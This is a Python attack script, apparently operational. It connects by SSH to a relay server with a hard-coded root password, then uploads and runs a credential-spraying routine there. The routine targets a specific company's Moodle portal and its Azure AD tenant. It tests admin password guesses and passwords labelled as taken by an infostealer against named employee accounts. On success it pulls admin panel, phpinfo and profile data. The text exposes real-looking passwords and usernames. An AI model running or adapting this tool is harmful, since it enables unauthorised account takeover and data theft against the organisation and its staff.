import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

MOODLE = "https://universidad.findep.mx"

def moodle_login(username, password):
    """Proper Moodle login with verification"""
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    
    r0 = s.get(f"{MOODLE}/login/index.php", timeout=10)
    lt = re.search(r'name="logintoken"\s+value="([^"]+)"', r0.text)
    
    r = s.post(f"{MOODLE}/login/index.php",
        data={"username": username, "password": password,
              "logintoken": lt.group(1) if lt else ""},
        timeout=10, allow_redirects=True)
    
    # Real verification: check if we can access /my/ (dashboard)
    r_my = s.get(f"{MOODLE}/my/", timeout=10)
    
    # If logged in, /my/ shows dashboard; if not, redirects to login
    is_dash = "Tablero" in r_my.text or "Dashboard" in r_my.text or "loggedinas" in r_my.text
    has_user = f'data-username="{username}"' in r_my.text
    
    # Check for login error in the POST response
    login_error = "loginerrors" in r.text.lower() or "invalidlogin" in r.text.lower() or "datos err" in r.text.lower()
    
    return {
        "session": s,
        "logged_in": is_dash or has_user,
        "login_error": login_error,
        "dashboard_size": len(r_my.text),
        "has_dashboard": is_dash,
    }


# ========================================
# 1. VERIFY KNOWN GOOD LOGIN (aguzmango)
# ========================================
sys.stdout.write("=" * 60 + "\n=== VERIFY LOGIN METHOD ===\n" + "=" * 60 + "\n\n")

result = moodle_login("aguzmango", "Capacita-1")
sys.stdout.write(f"aguzmango:Capacita-1 -> logged_in={result['logged_in']}, dashboard_size={result['dashboard_size']}, error={result['login_error']}\n")

# ========================================  
# 2. TEST ADMIN CREDENTIALS
# ========================================
sys.stdout.write("\n\n=== ADMIN LOGIN ATTEMPTS ===\n\n")

admin_attempts = [
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    ("admin", "admin"),
    ("admin", "Findep2024"),
    ("admin", "Findep2025"),
    ("admin", "Findep2026"),
    ("admin", "Admin2024"),
    ("admin", "Admin2025"),
    ("admin", "Admin2026"),
    ("admin", "Capacita-1"),
    ("admin", "AFI2022*"),
    ("admin1", "4dm1n##*2411"),
    ("admin1", "BcF1s42o2d*"),
    ("admin1", "Capacita-1"),
    ("administrator", "4dm1n##*2411"),
    ("administrador", "4dm1n##*2411"),
    ("siteadmin", "4dm1n##*2411"),
    ("capacitacion", "Capacita-1"),
    ("capacitacion", "4dm1n##*2411"),
]

for user, pwd in admin_attempts:
    result = moodle_login(user, pwd)
    tag = "*** SUCCESS ***" if result["logged_in"] else ("error" if result["login_error"] else "fail")
    sys.stdout.write(f"  {user}:{pwd[:15]}... -> {tag} (dash={result['dashboard_size']}b)\n")
    
    if result["logged_in"]:
        sys.stdout.write(f"\n  *** MOODLE ADMIN ACCESS ***\n")
        ms = result["session"]
        
        # Check admin access
        r_admin = ms.get(f"{MOODLE}/admin/index.php", timeout=10)
        title = re.search(r'<title>(.*?)</title>', r_admin.text[:3000], re.I)
        sys.stdout.write(f"  Admin panel: [{r_admin.status_code}] {title.group(1)[:60] if title else 'N/A'}\n")
        
        # PHPinfo
        r_php = ms.get(f"{MOODLE}/admin/phpinfo.php", timeout=10)
        sys.stdout.write(f"  PHPinfo: [{r_php.status_code}] ({len(r_php.text)}b)\n")
        
        if "phpinfo" in r_php.text.lower():
            server = re.search(r'SERVER_ADDR.*?<td[^>]*>([\d.]+)', r_php.text, re.S)
            sys.stdout.write(f"  Server IP: {server.group(1) if server else 'N/A'}\n")
        
        break
    sys.stdout.flush()

# ========================================
# 3. TRY ALL STEALER PASSWORDS ON ALL KNOWN USERNAMES
# ========================================
sys.stdout.write("\n\n=== CROSS-SPRAY: stealer PWDs x moodle users ===\n\n")

moodle_users = ["aguzmango", "mlunavald", "pgonzalezz", "bmendezar", "jcruzval"]
stealer_pwds = ["4dm1n##*2411", "BcF1s42o2d*", "AFI2022*", "Rul76846", "Pao1234+", "C#mbi@01", "Capacita-1"]

for user in moodle_users:
    for pwd in stealer_pwds:
        if user == "aguzmango" and pwd == "Capacita-1":
            continue  # Already confirmed
        
        result = moodle_login(user, pwd)
        if result["logged_in"]:
            sys.stdout.write(f"  *** LOGIN *** {user}:{pwd}\n")
            
            # Get user info
            ms = result["session"]
            r_profile = ms.get(f"{MOODLE}/user/profile.php", timeout=10)
            name = re.search(r'class="fullname"[^>]*>(.*?)<', r_profile.text)
            sys.stdout.write(f"    Name: {name.group(1) if name else 'N/A'}\n")
        else:
            tag = "error" if result["login_error"] else "fail"
            # Only log if interesting
            if not result["login_error"]:
                sys.stdout.write(f"  {user}:{pwd[:10]}... -> {tag}\n")
    sys.stdout.flush()

# ========================================
# 4. DYNAMICS BC — ROPC WITH admin UNLOCKED CHECK
# ========================================
sys.stdout.write("\n\n=== DYNAMICS BC — admin@findep.global CHECK ===\n\n")

# Check if admin is still locked
try:
    r = requests.post("https://login.microsoftonline.com/30fcec21-d05d-4ca6-8233-a90183fc7dbd/oauth2/v2.0/token",
        data={
            "grant_type": "password",
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "scope": "https://graph.microsoft.com/.default",
            "username": "admin@findep.global",
            "password": "4dm1n##*2411",
        },
        timeout=10, verify=False)
    
    data = r.json()
    if "access_token" in data:
        sys.stdout.write(f"*** AZURE AD LOGIN SUCCESS ***\n")
        sys.stdout.write(f"  Token: {data['access_token'][:80]}...\n")
        
        # Get user info
        token = data["access_token"]
        r_me = requests.get("https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if r_me.status_code == 200:
            me = r_me.json()
            sys.stdout.write(f"  Name: {me.get('displayName')}\n")
            sys.stdout.write(f"  Job: {me.get('jobTitle')}\n")
            sys.stdout.write(f"  UPN: {me.get('userPrincipalName')}\n")
    else:
        error = data.get("error_description", "")[:120]
        aadsts = re.search(r'AADSTS(\d+)', error)
        sys.stdout.write(f"  admin@findep.global: {aadsts.group(0) if aadsts else data.get('error', 'unknown')} — {error}\n")
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_moodle_verify.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_moodle_verify.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
